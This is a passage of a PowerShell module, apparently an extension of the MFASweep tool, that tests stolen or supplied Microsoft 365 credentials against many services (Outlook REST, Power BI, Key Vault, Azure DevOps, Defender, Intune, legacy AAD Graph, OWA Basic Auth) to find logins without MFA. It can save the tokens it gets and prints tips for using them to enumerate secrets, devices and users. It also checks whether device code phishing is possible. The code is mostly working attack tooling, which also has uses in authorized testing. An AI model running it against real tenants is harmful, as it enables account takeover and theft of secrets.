<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:a='http://www.w3.org/2005/08/addressing' xmlns:u='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd'>
  <s:Header>
    <a:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</a:Action>
    <a:To s:mustUnderstand='1'>$wsUrl</a:To>
    <o:Security s:mustUnderstand='1' xmlns:o='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd'>
      <o:UsernameToken>
        <o:Username>$xmlUsername</o:Username>
        <o:Password>$xmlPassword</o:Password>
      </o:UsernameToken>
    </o:Security>
  </s:Header>
  <s:Body>
    <t:RequestSecurityToken xmlns:t='http://schemas.xmlsoap.org/ws/2005/02/trust'>
      <wsp:AppliesTo xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy'>
        <a:EndpointReference><a:Address>urn:federation:MicrosoftOnline</a:Address></a:EndpointReference>
      </wsp:AppliesTo>
      <t:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</t:KeyType>
      <t:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</t:RequestType>
    </t:RequestSecurityToken>
  </s:Body>
</s:Envelope>
"@

    $headers = @{ "Content-Type" = "application/soap+xml; charset=utf-8"; "SOAPAction" = "http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue" }

    try {
        $resp = Invoke-MFASweepWebRequest -Uri $wsUrl -Method Post -Headers $headers -Body $soapBody -ErrorVariable RespErr
        if ($resp -and $resp.StatusCode -eq 200 -and $resp.Content -match "RequestedSecurityToken") {
            Write-Host -ForegroundColor Green "[*] SUCCESS! $Username obtained a WS-Trust security token. This endpoint has NO MFA  - credentials alone grant a token."
            Write-Host -ForegroundColor DarkGreen "[***] NOTE: This token can be exchanged for Azure AD access tokens without MFA via AADInternals or similar tools."
            $global:wstrustresult = "YES"
        } elseif ($resp -and $resp.Content -match "FailedAuthentication" -or $RespErr -match "401") {
            Write-Host -ForegroundColor Red "[*] WS-Trust AUTH failed  - invalid credentials."
        } else {
            Write-Host -ForegroundColor Yellow "[*] WS-Trust unexpected response (endpoint may be disabled or require Kerberos): $(if ($resp) { $resp.StatusCode } else { 'no response' })"
        }
    } catch {
        Write-Host -ForegroundColor Red "[*] WS-Trust request error: $_"
    }
}


Function Invoke-OutlookRESTAuth {
<#
.SYNOPSIS
    Tests Outlook REST API access via ROPC (Resource Owner Password Credentials).
    Resource: https://outlook.office.com  - covers OWA, Outlook mail, calendar, contacts.
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)]  [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)]  [string] $Password,
        [Parameter(Position = 2, Mandatory = $False)] [switch] $WriteTokens
    )

    Write-Host "`r`n"
    Write-Host "---------------- Outlook REST API (ROPC) ----------------"
    Write-Host -ForegroundColor Yellow "[*] Authenticating to Outlook REST API via ROPC (outlook.office.com)..."

    $Resource = "https://outlook.office.com"
    $ClientId  = "d3590ed6-52b3-4102-aeff-aad2292ab01c"   # Microsoft Office (universal client)

    $BodyParams  = @{ resource = $Resource; client_id = $ClientId; grant_type = "password"; username = $Username; password = $Password; scope = "openid" }
    $PostHeaders = @{ Accept = "application/json"; "Content-Type" = "application/x-www-form-urlencoded" }
    $webrequest  = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/common/oauth2/token" -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr

    if ($webrequest -and $webrequest.StatusCode -eq "200") {
        Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Outlook REST API without MFA. Full mailbox, calendar, and contacts are accessible."
        $global:outlookrestresult = "YES"
        if ($WriteTokens) {
            $rc = $webrequest.Content | ConvertFrom-Json
            Write-TokensToFile -WriteTokens:$WriteTokens -Resource $Resource -ClientId $ClientId -AccessToken $rc.access_token -RefreshToken $rc.refresh_token
        }
    } else {
        if     ($RespErr -match "AADSTS50126")                                      { Write-Host -ForegroundColor Red   "[*] Outlook REST login failed  - invalid credentials." }
        elseif (($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076")){ Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Outlook REST  - MFA required."; $global:outlookrestresult = "YES (MFA)" }
        elseif ($RespErr -match "AADSTS50158")                                      { Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Outlook REST  - CA MFA required."; $global:outlookrestresult = "YES (CA MFA)" }
        elseif ($RespErr -match "AADSTS53003")                                      { Write-Host                        "[*] WARNING! Conditional Access blocked Outlook REST for $Username." }
        elseif ($RespErr -match "AADSTS50053")                                      { Write-Host                        "[*] WARNING! Account $Username is locked." }
        elseif ($RespErr -match "AADSTS50057")                                      { Write-Host                        "[*] WARNING! Account $Username is disabled." }
        elseif ($RespErr -match "AADSTS50055")                                      { Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Outlook REST - password is expired."; $global:outlookrestresult = "YES (pwd expired)" }
        else                                                                         { Write-Host                        "[*] Outlook REST: unexpected response for $Username"; $RespErr }
    }
}


Function Invoke-OfficeManagementAuth {
<#
.SYNOPSIS
    Tests Office 365 Management API via ROPC.
    Resource: https://manage.office.com  - provides access to Office 365 audit logs,
    service health data, and management APIs. High-value for intelligence gathering.
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)]  [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)]  [string] $Password,
        [Parameter(Position = 2, Mandatory = $False)] [switch] $WriteTokens
    )

    Write-Host "`r`n"
    Write-Host "---------------- Office 365 Management API (ROPC) ----------------"
    Write-Host -ForegroundColor Yellow "[*] Authenticating to Office 365 Management API via ROPC (manage.office.com)..."

    $Resource = "https://manage.office.com"
    $ClientId  = "1b730954-1685-4b74-9bfd-dac224a7b894"   # Azure Active Directory PowerShell

    $BodyParams  = @{ resource = $Resource; client_id = $ClientId; grant_type = "password"; username = $Username; password = $Password; scope = "openid" }
    $PostHeaders = @{ Accept = "application/json"; "Content-Type" = "application/x-www-form-urlencoded" }
    $webrequest  = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/common/oauth2/token" -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr

    if ($webrequest -and $webrequest.StatusCode -eq "200") {
        Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Office 365 Management API without MFA."
        Write-Host -ForegroundColor DarkGreen "[***] NOTE: Audit logs, service health, and tenant management data may be accessible."
        $global:officemgmtresult = "YES"
        if ($WriteTokens) {
            $rc = $webrequest.Content | ConvertFrom-Json
            Write-TokensToFile -WriteTokens:$WriteTokens -Resource $Resource -ClientId $ClientId -AccessToken $rc.access_token -RefreshToken $rc.refresh_token
        }
    } else {
        if     ($RespErr -match "AADSTS50126")                                      { Write-Host -ForegroundColor Red   "[*] Office Management API login failed  - invalid credentials." }
        elseif (($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076")){ Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Office Mgmt API  - MFA required."; $global:officemgmtresult = "YES (MFA)" }
        elseif ($RespErr -match "AADSTS50158")                                      { Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Office Mgmt API  - CA MFA required."; $global:officemgmtresult = "YES (CA MFA)" }
        elseif ($RespErr -match "AADSTS53003")                                      { Write-Host                        "[*] WARNING! Conditional Access blocked Office Management API for $Username." }
        elseif ($RespErr -match "AADSTS50053")                                      { Write-Host                        "[*] WARNING! Account $Username is locked." }
        elseif ($RespErr -match "AADSTS50057")                                      { Write-Host                        "[*] WARNING! Account $Username is disabled." }
        elseif ($RespErr -match "AADSTS50055")                                      { Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Office Mgmt API - password is expired."; $global:officemgmtresult = "YES (pwd expired)" }
        else                                                                         { Write-Host                        "[*] Office Mgmt API: unexpected response for $Username"; $RespErr }
    }
}


Function Invoke-PowerBIAuth {
<#
.SYNOPSIS
    Tests Power BI API access via ROPC.
    Resource: https://analysis.windows.net/powerbi/api  - covers Power BI reports,
    datasets, and dashboards which often contain sensitive business data.
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)]  [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)]  [string] $Password,
        [Parameter(Position = 2, Mandatory = $False)] [switch] $WriteTokens
    )

    Write-Host "`r`n"
    Write-Host "---------------- Power BI API (ROPC) ----------------"
    Write-Host -ForegroundColor Yellow "[*] Authenticating to Power BI API via ROPC (analysis.windows.net/powerbi/api)..."

    $Resource = "https://analysis.windows.net/powerbi/api"
    $ClientId  = "23d8f6bd-1eb0-4cc2-a08c-7bf525c67bcd"   # Power BI PowerShell

    $BodyParams  = @{ resource = $Resource; client_id = $ClientId; grant_type = "password"; username = $Username; password = $Password; scope = "openid" }
    $PostHeaders = @{ Accept = "application/json"; "Content-Type" = "application/x-www-form-urlencoded" }
    $webrequest  = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/common/oauth2/token" -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr

    if ($webrequest -and $webrequest.StatusCode -eq "200") {
        Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Power BI API without MFA."
        Write-Host -ForegroundColor DarkGreen "[***] NOTE: Power BI reports and datasets may expose sensitive business intelligence data."
        $global:powerbiresult = "YES"
        if ($WriteTokens) {
            $rc = $webrequest.Content | ConvertFrom-Json
            Write-TokensToFile -WriteTokens:$WriteTokens -Resource $Resource -ClientId $ClientId -AccessToken $rc.access_token -RefreshToken $rc.refresh_token
        }
    } else {
        if     ($RespErr -match "AADSTS50126")                                      { Write-Host -ForegroundColor Red   "[*] Power BI API login failed  - invalid credentials." }
        elseif (($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076")){ Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Power BI  - MFA required."; $global:powerbiresult = "YES (MFA)" }
        elseif ($RespErr -match "AADSTS50158")                                      { Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Power BI  - CA MFA required."; $global:powerbiresult = "YES (CA MFA)" }
        elseif ($RespErr -match "AADSTS53003")                                      { Write-Host                        "[*] WARNING! Conditional Access blocked Power BI for $Username." }
        elseif ($RespErr -match "AADSTS50053")                                      { Write-Host                        "[*] WARNING! Account $Username is locked." }
        elseif ($RespErr -match "AADSTS50057")                                      { Write-Host                        "[*] WARNING! Account $Username is disabled." }
        elseif ($RespErr -match "AADSTS50055")                                      { Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Power BI - password is expired."; $global:powerbiresult = "YES (pwd expired)" }
        else                                                                         { Write-Host                        "[*] Power BI: unexpected response for $Username"; $RespErr }
    }
}


Function Invoke-DeviceCodeFlowCheck {
<#
.SYNOPSIS
    Checks whether the OAuth2 Device Code Flow is available for the tenant.
    Device Code Flow bypasses MFA/CA policies in many tenant configurations and is
    a common phishing vector (user is social-engineered into entering the device code).
    This function does NOT perform credential testing  - it only checks availability.
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [string] $Username
    )

    Write-Host "`r`n"
    Write-Host "---------------- Device Code Flow Availability Check ----------------"
    Write-Host -ForegroundColor Yellow "[*] Checking Device Code Flow availability for tenant (no credentials used)..."

    $domain = ($Username -split "@")[1]
    if (-not $domain) {
        Write-Host -ForegroundColor Red "[*] Device Code Flow check requires a UPN (user@domain). Received: $Username"
        return
    }
    $clientIds = @{
        "Azure CLI"                  = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
        "Azure PowerShell"           = "1950a258-227b-4e31-a9cf-717495945fc2"
        "Microsoft Graph PowerShell" = "14d82eec-204b-4c2f-b3e2-2d00d7d5d154"
    }

    $anyAvailable = $false
    foreach ($appName in $clientIds.Keys) {
        $clientId   = $clientIds[$appName]
        $BodyParams = @{ client_id = $clientId; scope = "https://graph.microsoft.com/.default offline_access" }
        $PostHeaders = @{ "Content-Type" = "application/x-www-form-urlencoded" }

        try {
            $resp = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/$domain/oauth2/v2.0/devicecode" -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorAction SilentlyContinue -ErrorVariable RespErr
            if ($resp -and $resp.StatusCode -eq 200) {
                $rc = $resp.Content | ConvertFrom-Json
                Write-Host -ForegroundColor Green "[*] Device Code Flow is AVAILABLE for client '$appName' (client_id: $clientId)."
                Write-Host -ForegroundColor DarkGreen "    User code: $($rc.user_code)  - verification URL: $($rc.verification_uri)"
                Write-Host -ForegroundColor DarkGreen "[***] NOTE: This tenant has NOT blocked Device Code Flow. Phishing via device code is possible."
                $anyAvailable = $true
                $global:devicecoderesult = "AVAILABLE"
            } elseif ($RespErr -match "AADSTS53003" -or $RespErr -match "authorization_pending") {
                Write-Host -ForegroundColor Yellow "[*] Device Code Flow issued a code but Conditional Access may intercept it for '$appName'."
            } elseif ($RespErr -match "device_flow_authorization_pending") {
                Write-Host -ForegroundColor Yellow "[*] Device Code Flow available (pending authorization) for '$appName'."
                $anyAvailable = $true
            } else {
                Write-Host -ForegroundColor Red "[*] Device Code Flow appears blocked for '$appName'. Response: $RespErr"
            }
        } catch {
            Write-Host -ForegroundColor Red "[*] Device Code check error for '$appName': $_"
        }
    }

    if (-not $anyAvailable) {
        Write-Host -ForegroundColor Green "[*] Device Code Flow appears to be blocked across all tested first-party clients. Good."
        $global:devicecoderesult = "BLOCKED"
    }
}


Function Invoke-KeyVaultAuth {
<#
.SYNOPSIS
    Tests Azure Key Vault API access via ROPC.
    Resource: https://vault.azure.net - access to secrets, keys, and certificates stored
    across the tenant's vaults. One of the highest-value targets in an Azure environment.
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)]  [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)]  [string] $Password,
        [Parameter(Position = 2, Mandatory = $False)] [switch] $WriteTokens
    )

    Write-Host "`r`n"
    Write-Host "---------------- Azure Key Vault API (ROPC) ----------------"
    Write-Host -ForegroundColor Yellow "[*] Authenticating to Azure Key Vault API via ROPC (vault.azure.net)..."

    $Resource = "https://vault.azure.net"
    $ClientId  = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"   # Azure CLI

    $BodyParams  = @{ resource = $Resource; client_id = $ClientId; grant_type = "password"; username = $Username; password = $Password; scope = "openid" }
    $PostHeaders = @{ Accept = "application/json"; "Content-Type" = "application/x-www-form-urlencoded" }
    $webrequest  = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/common/oauth2/token" -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr

    if ($webrequest -and $webrequest.StatusCode -eq "200") {
        Write-Host -ForegroundColor Green "[*] SUCCESS! $Username obtained a Key Vault token without MFA. All Key Vault secrets, keys, and certificates in this tenant may be readable."
        Write-Host -ForegroundColor DarkGreen "[***] NOTE: Use this token against https://<vault-name>.vault.azure.net/secrets?api-version=7.4 to enumerate secrets."
        $global:keyvaultresult = "YES"
        if ($WriteTokens) {
            $rc = $webrequest.Content | ConvertFrom-Json
            Write-TokensToFile -WriteTokens:$WriteTokens -Resource $Resource -ClientId $ClientId -AccessToken $rc.access_token -RefreshToken $rc.refresh_token
        }
    } else {
        if     ($RespErr -match "AADSTS50126")                                      { Write-Host -ForegroundColor Red   "[*] Key Vault ROPC failed - invalid credentials." }
        elseif (($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076")){ Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Key Vault - MFA required."; $global:keyvaultresult = "YES (MFA)" }
        elseif ($RespErr -match "AADSTS50158")                                      { Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Key Vault - CA MFA required."; $global:keyvaultresult = "YES (CA MFA)" }
        elseif ($RespErr -match "AADSTS53003")                                      { Write-Host                        "[*] WARNING! Conditional Access blocked Key Vault access for $Username." }
        elseif ($RespErr -match "AADSTS50053")                                      { Write-Host                        "[*] WARNING! Account $Username is locked." }
        elseif ($RespErr -match "AADSTS50057")                                      { Write-Host                        "[*] WARNING! Account $Username is disabled." }
        elseif ($RespErr -match "AADSTS50055")                                      { Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Key Vault - password is expired."; $global:keyvaultresult = "YES (pwd expired)" }
        else                                                                         { Write-Host                        "[*] Key Vault: unexpected response for $Username"; $RespErr }
    }
}


Function Invoke-AzureDevOpsAuth {
<#
.SYNOPSIS
    Tests Azure DevOps (VSTS) API access via ROPC.
    Resource: https://app.vssps.visualstudio.com - provides access to source code repositories,
    CI/CD pipelines, pipeline variables (which often contain secrets), work items, and artifacts.
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)]  [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)]  [string] $Password,
        [Parameter(Position = 2, Mandatory = $False)] [switch] $WriteTokens
    )

    Write-Host "`r`n"
    Write-Host "---------------- Azure DevOps / VSTS API (ROPC) ----------------"
    Write-Host -ForegroundColor Yellow "[*] Authenticating to Azure DevOps API via ROPC (app.vssps.visualstudio.com)..."

    $Resource = "https://app.vssps.visualstudio.com/"
    $ClientId  = "872cd9fa-d31f-45e0-9eab-6e460a02d1f1"   # Microsoft Visual Studio

    $BodyParams  = @{ resource = $Resource; client_id = $ClientId; grant_type = "password"; username = $Username; password = $Password; scope = "openid" }
    $PostHeaders = @{ Accept = "application/json"; "Content-Type" = "application/x-www-form-urlencoded" }
    $webrequest  = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/common/oauth2/token" -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr

    if ($webrequest -and $webrequest.StatusCode -eq "200") {
        Write-Host -ForegroundColor Green "[*] SUCCESS! $Username obtained an Azure DevOps token without MFA. Source repos, pipelines, and pipeline secrets may be accessible."
        Write-Host -ForegroundColor DarkGreen "[***] NOTE: Use this token against https://dev.azure.com/{org}/_apis/projects?api-version=7.1 to enumerate projects."
        $global:devopsresult = "YES"
        if ($WriteTokens) {
            $rc = $webrequest.Content | ConvertFrom-Json
            Write-TokensToFile -WriteTokens:$WriteTokens -Resource $Resource -ClientId $ClientId -AccessToken $rc.access_token -RefreshToken $rc.refresh_token
        }
    } else {
        if     ($RespErr -match "AADSTS50126")                                      { Write-Host -ForegroundColor Red   "[*] Azure DevOps ROPC failed - invalid credentials." }
        elseif (($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076")){ Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Azure DevOps - MFA required."; $global:devopsresult = "YES (MFA)" }
        elseif ($RespErr -match "AADSTS50158")                                      { Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Azure DevOps - CA MFA required."; $global:devopsresult = "YES (CA MFA)" }
        elseif ($RespErr -match "AADSTS53003")                                      { Write-Host                        "[*] WARNING! Conditional Access blocked Azure DevOps for $Username." }
        elseif ($RespErr -match "AADSTS50053")                                      { Write-Host                        "[*] WARNING! Account $Username is locked." }
        elseif ($RespErr -match "AADSTS50057")                                      { Write-Host                        "[*] WARNING! Account $Username is disabled." }
        elseif ($RespErr -match "AADSTS50055")                                      { Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Azure DevOps - password is expired."; $global:devopsresult = "YES (pwd expired)" }
        else                                                                         { Write-Host                        "[*] Azure DevOps: unexpected response for $Username"; $RespErr }
    }
}


Function Invoke-DefenderAuth {
<#
.SYNOPSIS
    Tests Microsoft Defender for Endpoint API access via ROPC.
    Resource: https://api.securitycenter.microsoft.com - provides access to endpoint telemetry,
    alerts, live response sessions, and machine inventory. High-value for lateral movement.
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)]  [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)]  [string] $Password,
        [Parameter(Position = 2, Mandatory = $False)] [switch] $WriteTokens
    )

    Write-Host "`r`n"
    Write-Host "---------------- Microsoft Defender for Endpoint API (ROPC) ----------------"
    Write-Host -ForegroundColor Yellow "[*] Authenticating to Defender for Endpoint API via ROPC (api.securitycenter.microsoft.com)..."

    $Resource = "https://api.securitycenter.microsoft.com"
    $ClientId  = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"   # Azure CLI

    $BodyParams  = @{ resource = $Resource; client_id = $ClientId; grant_type = "password"; username = $Username; password = $Password; scope = "openid" }
    $PostHeaders = @{ Accept = "application/json"; "Content-Type" = "application/x-www-form-urlencoded" }
    $webrequest  = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/common/oauth2/token" -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr

    if ($webrequest -and $webrequest.StatusCode -eq "200") {
        Write-Host -ForegroundColor Green "[*] SUCCESS! $Username obtained a Defender for Endpoint token without MFA. Security alerts, machine inventory, and live response may be accessible."
        Write-Host -ForegroundColor DarkGreen "[***] NOTE: Use this token against https://api.securitycenter.microsoft.com/api/machines to enumerate enrolled endpoints."
        $global:defenderresult = "YES"
        if ($WriteTokens) {
            $rc = $webrequest.Content | ConvertFrom-Json
            Write-TokensToFile -WriteTokens:$WriteTokens -Resource $Resource -ClientId $ClientId -AccessToken $rc.access_token -RefreshToken $rc.refresh_token
        }
    } else {
        if     ($RespErr -match "AADSTS50126")                                      { Write-Host -ForegroundColor Red   "[*] Defender API ROPC failed - invalid credentials." }
        elseif (($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076")){ Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Defender API - MFA required."; $global:defenderresult = "YES (MFA)" }
        elseif ($RespErr -match "AADSTS50158")                                      { Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Defender API - CA MFA required."; $global:defenderresult = "YES (CA MFA)" }
        elseif ($RespErr -match "AADSTS53003")                                      { Write-Host                        "[*] WARNING! Conditional Access blocked Defender API for $Username." }
        elseif ($RespErr -match "AADSTS50053")                                      { Write-Host                        "[*] WARNING! Account $Username is locked." }
        elseif ($RespErr -match "AADSTS50057")                                      { Write-Host                        "[*] WARNING! Account $Username is disabled." }
        elseif ($RespErr -match "AADSTS50055")                                      { Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Defender API - password is expired."; $global:defenderresult = "YES (pwd expired)" }
        else                                                                         { Write-Host                        "[*] Defender API: unexpected response for $Username"; $RespErr }
    }
}


Function Invoke-IntuneAuth {
<#
.SYNOPSIS
    Tests Microsoft Intune (MDM) API access via ROPC.
    Resource: https://api.manage.microsoft.com - provides access to enrolled device inventory,
    compliance policies, configuration profiles, and app deployment settings.
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)]  [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)]  [string] $Password,
        [Parameter(Position = 2, Mandatory = $False)] [switch] $WriteTokens
    )

    Write-Host "`r`n"
    Write-Host "---------------- Microsoft Intune API (ROPC) ----------------"
    Write-Host -ForegroundColor Yellow "[*] Authenticating to Microsoft Intune API via ROPC (api.manage.microsoft.com)..."

    $Resource = "https://api.manage.microsoft.com"
    $ClientId  = "1b730954-1685-4b74-9bfd-dac224a7b894"   # Azure AD PowerShell module

    $BodyParams  = @{ resource = $Resource; client_id = $ClientId; grant_type = "password"; username = $Username; password = $Password; scope = "openid" }
    $PostHeaders = @{ Accept = "application/json"; "Content-Type" = "application/x-www-form-urlencoded" }
    $webrequest  = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/common/oauth2/token" -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr

    if ($webrequest -and $webrequest.StatusCode -eq "200") {
        Write-Host -ForegroundColor Green "[*] SUCCESS! $Username obtained an Intune token without MFA. Device inventory, compliance policies, and MDM configs may be accessible."
        Write-Host -ForegroundColor DarkGreen "[***] NOTE: Use this token against https://graph.microsoft.com/v1.0/deviceManagement/managedDevices to enumerate enrolled devices."
        $global:intuneresult = "YES"
        if ($WriteTokens) {
            $rc = $webrequest.Content | ConvertFrom-Json
            Write-TokensToFile -WriteTokens:$WriteTokens -Resource $Resource -ClientId $ClientId -AccessToken $rc.access_token -RefreshToken $rc.refresh_token
        }
    } else {
        if     ($RespErr -match "AADSTS50126")                                      { Write-Host -ForegroundColor Red   "[*] Intune ROPC failed - invalid credentials." }
        elseif (($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076")){ Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Intune - MFA required."; $global:intuneresult = "YES (MFA)" }
        elseif ($RespErr -match "AADSTS50158")                                      { Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Intune - CA MFA required."; $global:intuneresult = "YES (CA MFA)" }
        elseif ($RespErr -match "AADSTS53003")                                      { Write-Host                        "[*] WARNING! Conditional Access blocked Intune for $Username." }
        elseif ($RespErr -match "AADSTS50053")                                      { Write-Host                        "[*] WARNING! Account $Username is locked." }
        elseif ($RespErr -match "AADSTS50057")                                      { Write-Host                        "[*] WARNING! Account $Username is disabled." }
        elseif ($RespErr -match "AADSTS50055")                                      { Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to Intune - password is expired."; $global:intuneresult = "YES (pwd expired)" }
        else                                                                         { Write-Host                        "[*] Intune: unexpected response for $Username"; $RespErr }
    }
}


Function Invoke-AADGraphAuth {
<#
.SYNOPSIS
    Tests legacy Azure AD Graph v1 API access via ROPC.
    Resource: https://graph.windows.net - the older Azure AD Graph endpoint (deprecated but still
    active on most tenants). Conditional Access policies often cover only the newer Graph v2
    (graph.microsoft.com), leaving this endpoint less protected.
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)]  [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)]  [string] $Password,
        [Parameter(Position = 2, Mandatory = $False)] [switch] $WriteTokens
    )

    Write-Host "`r`n"
    Write-Host "---------------- Azure AD Graph v1 Legacy API (ROPC) ----------------"
    Write-Host -ForegroundColor Yellow "[*] Authenticating to Azure AD Graph v1 API via ROPC (graph.windows.net)..."
    Write-Host -ForegroundColor Yellow "[*] NOTE: CA policies targeting 'Microsoft Graph' (v2) may not cover this legacy endpoint."

    $Resource = "https://graph.windows.net"
    $ClientId  = "1b730954-1685-4b74-9bfd-dac224a7b894"   # Azure AD PowerShell module

    $BodyParams  = @{ resource = $Resource; client_id = $ClientId; grant_type = "password"; username = $Username; password = $Password; scope = "openid" }
    $PostHeaders = @{ Accept = "application/json"; "Content-Type" = "application/x-www-form-urlencoded" }
    $webrequest  = Invoke-MFASweepWebRequest -Uri "https://login.microsoftonline.com/common/oauth2/token" -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr

    if ($webrequest -and $webrequest.StatusCode -eq "200") {
        Write-Host -ForegroundColor Green "[*] SUCCESS! $Username obtained an Azure AD Graph v1 token without MFA."
        Write-Host -ForegroundColor DarkGreen "[***] NOTE: Query https://graph.windows.net/{tenant}/users?api-version=1.6 to enumerate directory objects."
        $global:aadgraphresult = "YES"
        if ($WriteTokens) {
            $rc = $webrequest.Content | ConvertFrom-Json
            Write-TokensToFile -WriteTokens:$WriteTokens -Resource $Resource -ClientId $ClientId -AccessToken $rc.access_token -RefreshToken $rc.refresh_token
        }
    } else {
        if     ($RespErr -match "AADSTS50126")                                      { Write-Host -ForegroundColor Red   "[*] AAD Graph v1 ROPC failed - invalid credentials." }
        elseif (($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076")){ Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to AAD Graph v1 - MFA required."; $global:aadgraphresult = "YES (MFA)" }
        elseif ($RespErr -match "AADSTS50158")                                      { Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to AAD Graph v1 - CA MFA required."; $global:aadgraphresult = "YES (CA MFA)" }
        elseif ($RespErr -match "AADSTS53003")                                      { Write-Host                        "[*] WARNING! Conditional Access blocked AAD Graph v1 for $Username." }
        elseif ($RespErr -match "AADSTS50053")                                      { Write-Host                        "[*] WARNING! Account $Username is locked." }
        elseif ($RespErr -match "AADSTS50057")                                      { Write-Host                        "[*] WARNING! Account $Username is disabled." }
        elseif ($RespErr -match "AADSTS50055")                                      { Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to AAD Graph v1 - password is expired."; $global:aadgraphresult = "YES (pwd expired)" }
        else                                                                         { Write-Host                        "[*] AAD Graph v1: unexpected response for $Username"; $RespErr }
    }
}


Function Invoke-OWABasicAuth {
<#
.SYNOPSIS
    Tests whether Outlook Web Access (OWA) still accepts HTTP Basic Authentication.
    Sends an Authorization: Basic header directly to outlook.office365.com/owa/.
    A 200 or authenticated redirect indicates Basic Auth is active for this account.
    Basic Auth to OWA cannot enforce MFA.
#>
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [string] $Username,
        [Parameter(Position = 1, Mandatory = $True)] [string] $Password
    )

    Write-Host "`r`n"
    Write-Host "---------------- OWA Basic Auth (outlook.office365.com/owa/) ----------------"
    Write-Host -ForegroundColor Yellow "[*] Testing OWA legacy Basic Auth against outlook.office365.com/owa/..."

    $creds   = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("${Username}:${Password}"))
    $headers = @{ Authorization = "Basic $creds"; Accept = "text/html,application/xhtml+xml" }

    $webrequest = Invoke-MFASweepWebRequest -Uri "https://outlook.office365.com/owa/" -Method Get -Headers $headers -ErrorVariable RespErr

    if ($webrequest -and $webrequest.StatusCode -eq 200 -and $webrequest.Content -match "(OWA|Outlook|inbox|mail)") {
        Write-Host -ForegroundColor Green "[*] SUCCESS! $Username authenticated to OWA via Basic Auth without MFA. Mailbox is directly accessible."
